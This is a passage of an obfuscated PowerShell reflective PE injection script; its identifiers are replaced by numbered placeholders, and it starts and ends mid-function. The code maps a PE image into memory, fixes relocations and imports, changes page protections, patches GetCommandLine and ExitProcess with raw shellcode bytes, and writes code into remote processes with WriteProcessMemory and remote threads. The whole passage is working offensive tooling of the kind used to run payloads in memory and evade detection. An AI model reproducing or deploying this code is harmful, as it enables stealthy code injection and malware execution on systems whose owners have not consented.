		if (${31} -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		${4} = $Win32Functions.WriteProcessMemory.Invoke(${f3}, ${31}, ${35}, [UIntPtr][UInt64]${33}, [Ref]${34})
		if ((${4} -eq $false) -or ([UInt64]${34} -ne [UInt64]${33}))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		${6} = f29 -f16 ${f3} -f13 ${31} -Win32Functions $Win32Functions 
		${32} = $Win32Functions.WaitForSingleObject.Invoke(${6}, 20000)
		if (${32} -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		[IntPtr]${126} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${38})
		${32} = $Win32Functions.ReadProcessMemory.Invoke(${f3}, ${124}, ${126}, [UIntPtr][UInt64]${38}, [Ref]${34})
		if ((${32} -eq $false) -or (${34} -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]${123} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${126}, [Type][IntPtr])
		$Win32Functions.VirtualFreeEx.Invoke(${f3}, ${31}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke(${f3}, ${125}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke(${f3}, ${124}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		return ${123}
	}
	Function f45
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		${f5},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${f4},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		for( ${54} = 0; ${54} -lt ${f4}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${54}++)
		{
			[IntPtr]${98} = [IntPtr](f30 ([Int64]${f4}.SectionHeaderPtr) (${54} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			${97} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${98}, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]${122} = [IntPtr](f30 ([Int64]${f4}.PEHandle) ([Int64]${97}.VirtualAddress))
			${121} = ${97}.SizeOfRawData
			if (${97}.PointerToRawData -eq 0)
			{
				${121} = 0
			}
			if (${121} -gt ${97}.VirtualSize)
			{
				${121} = ${97}.VirtualSize
			}
			if (${121} -gt 0)
			{
				f47 -f23 "Copy-Sections::MarshalCopy" -f4 ${f4} -f13 ${122} -f24 ${121} | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy(${f5}, [Int32]${97}.PointerToRawData, ${122}, ${121})
			}
			if (${97}.SizeOfRawData -lt ${97}.VirtualSize)
			{
				${120} = ${97}.VirtualSize - ${121}
				[IntPtr]${f13} = [IntPtr](f30 ([Int64]${122}) ([Int64]${121}))
				f47 -f23 "Copy-Sections::Memset" -f4 ${f4} -f13 ${f13} -f24 ${120} | Out-Null
				$Win32Functions.memset.Invoke(${f13}, 0, [IntPtr]${120}) | Out-Null
			}
		}
	}
	Function f44
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${f4},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${f7},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		[Int64]${112} = 0
		${113} = $true 
		[UInt32]${118} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		if ((${f7} -eq [Int64]${f4}.EffectivePEHandle) `
				-or (${f4}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}
		elseif ((f51 (${f7}) (${f4}.EffectivePEHandle)) -eq $true)
		{
			${112} = f31 (${f7}) (${f4}.EffectivePEHandle)
			${113} = $false
		}
		elseif ((f51 (${f4}.EffectivePEHandle) (${f7})) -eq $true)
		{
			${112} = f31 (${f4}.EffectivePEHandle) (${f7})
		}
		[IntPtr]${107} = [IntPtr](f30 ([Int64]${f4}.PEHandle) ([Int64]${f4}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			${106} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${107}, [Type]$Win32Types.IMAGE_BASE_RELOCATION)
			if (${106}.SizeOfBlock -eq 0)
			{
				break
			}
			[IntPtr]${115} = [IntPtr](f30 ([Int64]${f4}.PEHandle) ([Int64]${106}.VirtualAddress))
			${119} = (${106}.SizeOfBlock - ${118}) / 2
			for(${54} = 0; ${54} -lt ${119}; ${54}++)
			{
				${117} = [IntPtr](f30 ([IntPtr]${107}) ([Int64]${118} + (2 * ${54})))
				[UInt16]${108} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${117}, [Type][UInt16])
				[UInt16]${114} = ${108} -band 0x0FFF
				[UInt16]${109} = ${108} -band 0xF000
				for (${116} = 0; ${116} -lt 12; ${116}++)
				{
					${109} = [Math]::Floor(${109} / 2)
				}
				if ((${109} -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or (${109} -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					[IntPtr]${110} = [IntPtr](f30 ([Int64]${115}) ([Int64]${114}))
					[IntPtr]${111} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${110}, [Type][IntPtr])
					if (${113} -eq $true)
					{
						[IntPtr]${111} = [IntPtr](f30 ([Int64]${111}) (${112}))
					}
					else
					{
						[IntPtr]${111} = [IntPtr](f31 ([Int64]${111}) (${112}))
					}				
					[System.Runtime.InteropServices.Marshal]::StructureToPtr(${111}, ${110}, $false) | Out-Null
				}
				elseif (${109} -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw "Unknown relocation found, relocation value: ${109}, relocationinfo: ${108}"
				}
			}
			${107} = [IntPtr](f30 ([Int64]${107}) ([Int64]${106}.SizeOfBlock))
		}
	}
	Function f43
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${f4},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		${f3}
		)
		${41} = $false
		if (${f4}.PEHandle -ne ${f4}.EffectivePEHandle)
		{
			${41} = $true
		}
		if (${f4}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${23} = f30 ([Int64]${f4}.PEHandle) ([Int64]${f4}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${26} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${23}, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				if (${26}.Characteristics -eq 0 `
						-and ${26}.FirstThunk -eq 0 `
						-and ${26}.ForwarderChain -eq 0 `
						-and ${26}.Name -eq 0 `
						-and ${26}.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}
				${25} = [IntPtr]::Zero
				${f12} = (f30 ([Int64]${f4}.PEHandle) ([Int64]${26}.Name))
				${24} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${f12})
				if (${41} -eq $true)
				{
					${25} = f50 -f3 ${f3} -f12 ${f12}
				}
				else
				{
					${25} = $Win32Functions.LoadLibrary.Invoke(${24})
				}
				if ((${25} -eq $null) -or (${25} -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: ${24}"
				}
				[IntPtr]${102} = f30 (${f4}.PEHandle) (${26}.FirstThunk)
				[IntPtr]${100} = f30 (${f4}.PEHandle) (${26}.Characteristics) 
				[IntPtr]${101} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${100}, [Type][IntPtr])
				while (${101} -ne [IntPtr]::Zero)
				{
					${104} = ''
					[IntPtr]${103} = [IntPtr]::Zero
					if([Int64]${101} -lt 0)
					{
						${104} = [Int64]${101} -band 0xffff 
					}
					else
					{
						[IntPtr]${105} = f30 (${f4}.PEHandle) (${101})
						${105} = f30 ${105} ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						${104} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${105})
					}
					if (${41} -eq $true)
					{
						[IntPtr]${103} = f49 -f3 ${f3} -f14 ${25} -f8 ${104}
					}
					else
					{
						if(${104} -is [string])
						{
						    [IntPtr]${103} = $Win32Functions.GetProcAddress.Invoke(${25}, ${104})
						}
						else
						{
						    [IntPtr]${103} = $Win32Functions.GetProcAddressOrdinal.Invoke(${25}, ${104})
						}
					}
					if (${103} -eq $null -or ${103} -eq [IntPtr]::Zero)
					{
						Throw "New function reference is null, this is almost certainly a bug in this script. Function: ${104}. Dll: ${24}"
					}
					[System.Runtime.InteropServices.Marshal]::StructureToPtr(${103}, ${102}, $false)
					${102} = f30 ([Int64]${102}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]${100} = f30 ([Int64]${100}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]${101} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${100}, [Type][IntPtr])
				}
				${23} = f30 (${23}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}
	Function f48
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		${f11}
		)
		${99} = 0x0
		if ((${f11} -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if ((${f11} -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${f11} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${99} = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					${99} = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if ((${f11} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${99} = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					${99} = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if ((${f11} -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${f11} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${99} = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					${99} = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if ((${f11} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${99} = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					${99} = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		if ((${f11} -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			${99} = ${99} -bor $Win32Constants.PAGE_NOCACHE
		}
		return ${99}
	}
	Function f42
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${f4},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		for( ${54} = 0; ${54} -lt ${f4}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${54}++)
		{
			[IntPtr]${98} = [IntPtr](f30 ([Int64]${f4}.SectionHeaderPtr) (${54} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			${97} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${98}, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]${96} = f30 (${f4}.PEHandle) (${97}.VirtualAddress)
			[UInt32]${94} = f48 ${97}.Characteristics
			[UInt32]${95} = ${97}.VirtualSize
			[UInt32]${59} = 0
			f47 -f23 "Update-MemoryProtectionFlags::VirtualProtect" -f4 ${f4} -f13 ${96} -f24 ${95} | Out-Null
			${4} = $Win32Functions.VirtualProtect.Invoke(${96}, ${95}, ${94}, [Ref]${59})
			if (${4} -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	Function f40
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${f4},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		${f10},
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		${f6}
		)
		${61} = @() 
		${38} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]${59} = 0
		[IntPtr]${48} = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if (${48} -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		[IntPtr]${93} = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if (${93} -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}
		${87} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${f10})
		${90} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${f10})
		[IntPtr]${88} = $Win32Functions.GetProcAddress.Invoke(${93}, "GetCommandLineA")
		[IntPtr]${85} = $Win32Functions.GetProcAddress.Invoke(${93}, "GetCommandLineW")
		if (${88} -eq [IntPtr]::Zero -or ${85} -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: ${88}. GetCommandLineW: ${85}"
		}
		[Byte[]]${68} = @()
		if (${38} -eq 8)
		{
			${68} += 0x48	
		}
		${68} += 0xb8
		[Byte[]]${67} = @(0xc3)
		${62} = ${68}.Length + ${38} + ${67}.Length
		${92} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${62})
		${91} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${62})
		$Win32Functions.memcpy.Invoke(${92}, ${88}, [UInt64]${62}) | Out-Null
		$Win32Functions.memcpy.Invoke(${91}, ${85}, [UInt64]${62}) | Out-Null
		${61} += ,(${88}, ${92}, ${62})
		${61} += ,(${85}, ${91}, ${62})
		[UInt32]${59} = 0
		${4} = $Win32Functions.VirtualProtect.Invoke(${88}, [UInt32]${62}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${59})
		if (${4} = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		${89} = ${88}
		f41 -f21 ${68} -f22 ${89}
		${89} = f30 ${89} (${68}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${90}, ${89}, $false)
		${89} = f30 ${89} ${38}
		f41 -f21 ${67} -f22 ${89}
		$Win32Functions.VirtualProtect.Invoke(${88}, [UInt32]${62}, [UInt32]${59}, [Ref]${59}) | Out-Null
		[UInt32]${59} = 0
		${4} = $Win32Functions.VirtualProtect.Invoke(${85}, [UInt32]${62}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${59})
		if (${4} = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		${86} = ${85}
		f41 -f21 ${68} -f22 ${86}
		${86} = f30 ${86} (${68}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${87}, ${86}, $false)
		${86} = f30 ${86} ${38}
		f41 -f21 ${67} -f22 ${86}
		$Win32Functions.VirtualProtect.Invoke(${85}, [UInt32]${62}, [UInt32]${59}, [Ref]${59}) | Out-Null
		${84} = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		foreach (${83} in ${84})
		{
			[IntPtr]${82} = $Win32Functions.GetModuleHandle.Invoke(${83})
			if (${82} -ne [IntPtr]::Zero)
			{
				[IntPtr]${74} = $Win32Functions.GetProcAddress.Invoke(${82}, "_wcmdln")
				[IntPtr]${76} = $Win32Functions.GetProcAddress.Invoke(${82}, "_acmdln")
				if (${74} -eq [IntPtr]::Zero -or ${76} -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				${77} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${f10})
				${75} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${f10})
				${81} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${76}, [Type][IntPtr])
				${80} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${74}, [Type][IntPtr])
				${79} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${38})
				${78} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${38})
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${81}, ${79}, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${80}, ${78}, $false)
				${61} += ,(${76}, ${79}, ${38})
				${61} += ,(${74}, ${78}, ${38})
				${4} = $Win32Functions.VirtualProtect.Invoke(${76}, [UInt32]${38}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${59})
				if (${4} = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${77}, ${76}, $false)
				$Win32Functions.VirtualProtect.Invoke(${76}, [UInt32]${38}, [UInt32](${59}), [Ref]${59}) | Out-Null
				${4} = $Win32Functions.VirtualProtect.Invoke(${74}, [UInt32]${38}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${59})
				if (${4} = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${75}, ${74}, $false)
				$Win32Functions.VirtualProtect.Invoke(${74}, [UInt32]${38}, [UInt32](${59}), [Ref]${59}) | Out-Null
			}
		}
		${61} = @()
		${70} = @() 
		[IntPtr]${73} = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if (${73} -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]${72} = $Win32Functions.GetProcAddress.Invoke(${73}, "CorExitProcess")
		if (${72} -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		${70} += ${72}
		[IntPtr]${71} = $Win32Functions.GetProcAddress.Invoke(${48}, "ExitProcess")
		if (${71} -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		${70} += ${71}
		[UInt32]${59} = 0
		foreach (${63} in ${70})
		{
			${64} = ${63}
			[Byte[]]${68} = @(0xbb)
			[Byte[]]${67} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if (${38} -eq 8)
			{
				[Byte[]]${68} = @(0x48, 0xbb)
				[Byte[]]${67} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]${65} = @(0xff, 0xd3)
			${62} = ${68}.Length + ${38} + ${67}.Length + ${38} + ${65}.Length
			[IntPtr]${66} = $Win32Functions.GetProcAddress.Invoke(${48}, "ExitThread")
			if (${66} -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}
			${4} = $Win32Functions.VirtualProtect.Invoke(${63}, [UInt32]${62}, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]${59})
			if (${4} -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			${69} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${62})
			$Win32Functions.memcpy.Invoke(${69}, ${63}, [UInt64]${62}) | Out-Null
			${61} += ,(${63}, ${69}, ${62})
			f41 -f21 ${68} -f22 ${64}
			${64} = f30 ${64} (${68}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${f6}, ${64}, $false)
			${64} = f30 ${64} ${38}
			f41 -f21 ${67} -f22 ${64}
			${64} = f30 ${64} (${67}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${66}, ${64}, $false)
			${64} = f30 ${64} ${38}
			f41 -f21 ${65} -f22 ${64}
			$Win32Functions.VirtualProtect.Invoke(${63}, [UInt32]${62}, [UInt32]${59}, [Ref]${59}) | Out-Null
		}
		Write-Output ${61}
	}
	Function f39
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		${f9},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[UInt32]${59} = 0
		foreach (${60} in ${f9})
		{
			${4} = $Win32Functions.VirtualProtect.Invoke(${60}[0], [UInt32]${60}[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]${59})
			if (${4} -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			$Win32Functions.memcpy.Invoke(${60}[0], ${60}[1], [UInt64]${60}[2]) | Out-Null
			$Win32Functions.VirtualProtect.Invoke(${60}[0], [UInt32]${60}[2], [UInt32]${59}, [Ref]${59}) | Out-Null
		}
	}
	Function f32
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${f2},
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		${f8}
		)
		$Win32Types = f37
		$Win32Constants = f36
		${f4} = f34 -f2 ${f2} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (${f4}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		${58} = f30 (${f2}) (${f4}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		${52} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${58}, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		for (${54} = 0; ${54} -lt ${52}.NumberOfNames; ${54}++)
		{
			${57} = f30 (${f2}) (${52}.AddressOfNames + (${54} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			${56} = f30 (${f2}) ([System.Runtime.InteropServices.Marshal]::PtrToStructure(${57}, [Type][UInt32]))
			${55} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${56})
			if (${55} -ceq ${f8})
			{
				${53} = f30 (${f2}) (${52}.AddressOfNameOrdinals + (${54} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				${51} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${53}, [Type][UInt16])
				${50} = f30 (${f2}) (${52}.AddressOfFunctions + (${51} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				${49} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${50}, [Type][UInt32])
				return f30 (${f2}) (${49})
			}
		}
		return [IntPtr]::Zero
	}
	Function f35
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		${f5},
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		${f1},
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		${f3}
		)
		${38} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$Win32Constants = f36
		$Win32Functions = f38
		$Win32Types = f37
		${41} = $false
		if ((${f3} -ne $null) -and (${f3} -ne [IntPtr]::Zero))
		{
			${41} = $true
		}
		Write-Verbose "Getting basic PE information from the file"
		${f4} = f46 -f5 ${f5} -Win32Types $Win32Types
		${f7} = ${f4}.OriginalImageBase
		${42} = $true
		if (([Int] ${f4}.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			${42} = $false
		}
		${45} = $true
		if (${41} -eq $true)
		{
			${48} = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			${32} = $Win32Functions.GetProcAddress.Invoke(${48}, "IsWow64Process")
			if (${32} -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			[Bool]${47} = $false
			${4} = $Win32Functions.IsWow64Process.Invoke(${f3}, [Ref]${47})
			if (${4} -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			if ((${47} -eq $true) -or ((${47} -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				${45} = $false
			}
			${46} = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${46} = $false
			}
			if (${46} -ne ${45})
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${45} = $false
			}
		}
		if (${45} -ne ${f4}.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		[IntPtr]${44} = [IntPtr]::Zero
		if (([Int] ${f4}.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			[IntPtr]${44} = ${f7}
		}
		${f2} = [IntPtr]::Zero				
		${27} = [IntPtr]::Zero		
		if (${41} -eq $true)
		{
			${f2} = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]${f4}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			${27} = $Win32Functions.VirtualAllocEx.Invoke(${f3}, ${44}, [UIntPtr]${f4}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if (${27} -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if (${42} -eq $true)
			{
				${f2} = $Win32Functions.VirtualAlloc.Invoke(${44}, [UIntPtr]${f4}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				${f2} = $Win32Functions.VirtualAlloc.Invoke(${44}, [UIntPtr]${f4}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			${27} = ${f2}
		}
		[IntPtr]${43} = f30 (${f2}) ([Int64]${f4}.SizeOfImage)
		if (${f2} -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy(${f5}, 0, ${f2}, ${f4}.SizeOfHeaders) | Out-Null
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		${f4} = f34 -f2 ${f2} -Win32Types $Win32Types -Win32Constants $Win32Constants
		${f4} | Add-Member -MemberType NoteProperty -Name EndAddress -Value ${43}
		${f4} | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value ${27}
		Write-Verbose "StartAddress: ${f2}    EndAddress: ${43}"
		Write-Verbose "Copy PE sections in to memory"
		f45 -f5 ${f5} -f4 ${f4} -Win32Functions $Win32Functions -Win32Types $Win32Types
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		f44 -f4 ${f4} -f7 ${f7} -Win32Constants $Win32Constants -Win32Types $Win32Types
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if (${41} -eq $true)
		{
			f43 -f4 ${f4} -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -f3 ${f3}
		}
		else
		{
			f43 -f4 ${f4} -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		if (${41} -eq $false)
		{
			if (${42} -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				f42 -f4 ${f4} -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		if (${41} -eq $true)
		{
			[UInt32]${34} = 0
			${4} = $Win32Functions.WriteProcessMemory.Invoke(${f3}, ${27}, ${f2}, [UIntPtr](${f4}.SizeOfImage), [Ref]${34})
			if (${4} -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		if (${f4}.FileType -ieq "DLL")
		{
			if (${41} -eq $false)
			{
